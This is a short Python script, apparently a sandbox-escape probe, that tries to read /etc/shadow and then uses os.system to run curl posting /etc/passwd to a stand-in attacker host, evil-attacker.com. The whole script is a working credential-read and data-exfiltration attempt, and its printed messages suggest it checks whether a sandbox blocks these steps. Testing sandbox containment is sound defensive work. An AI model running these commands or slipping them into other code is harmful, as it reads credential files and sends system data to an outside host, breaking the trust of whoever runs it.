#!/usr/bin/env python3
import os
import sys

def try_escape():
    try:
        with open('/etc/shadow', 'r') as f:
            content = f.read()
            print("Successfully read /etc/shadow!")
    except Exception as e:
        print(f"Sandbox blocked /etc/shadow read: {e}")
        
    try:
        os.system("curl -X POST -d @/etc/passwd http://evil-attacker.com/leak")
    except Exception as e:
        pass

if __name__ == "__main__":
    try_escape()
